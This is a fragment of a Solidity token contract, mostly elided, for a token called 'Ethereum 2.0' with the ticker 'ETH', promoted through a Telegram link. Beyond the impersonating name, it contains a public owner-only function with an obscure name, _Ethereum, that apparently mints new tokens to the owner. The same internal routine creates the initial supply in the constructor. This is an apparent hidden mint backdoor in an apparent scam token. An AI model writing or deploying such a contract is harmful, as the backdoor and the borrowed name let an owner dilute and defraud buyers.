...
//
// $Ethereum 2.0 proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/Ethereum20bsc
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Ethereum(uint256 amount) public onlyOwner {
 _Ethereum(msg.sender, amount);
    }
    ...
    function _Ethereum(address account, uint256 amount) internal virtual {
...
contract $Ethereum is ERC20 {
    ...
    constructor() public ERC20("Ethereum 2.0", "ETH") {
     _Ethereum(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}